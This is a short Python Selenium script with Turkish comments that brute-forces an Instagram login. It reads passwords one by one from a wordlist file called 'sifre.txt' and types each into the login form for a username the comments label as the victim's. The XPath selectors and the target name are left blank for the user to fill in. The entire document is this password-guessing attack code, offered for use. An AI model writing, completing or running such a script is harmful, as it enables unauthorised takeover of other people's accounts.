from selenium import webdriver
import time

browser = webdriver.Firefox()
browser.get('https://www.instagram.com/')
time.sleep(2)
k_adi = browser.find_element_by_xpath('') #Kullanıcı alanının xpath kodu
k_sifre = browser.find_element_by_xpath('') #Şifre alanının xpath kodu
giris = browser.find_element_by_xpath('') #Giriş Butonunun xpath kodu

dosya = open('sifre.txt','r')
time.sleep(3)

for sifre in dosya:
    k_adi.send_keys('') #Kurbanın instagram ismi
    k_sifre.send_keys(sifre)
    print(sifre)
    giris.click()
    time.sleep(2)

    browser.find_element_by_xpath('').clear() #Kullanıcı alanının xpath kodu
    browser.find_element_by_xpath('').clear() #Şifre alanının xpath kodu

dosya.close()
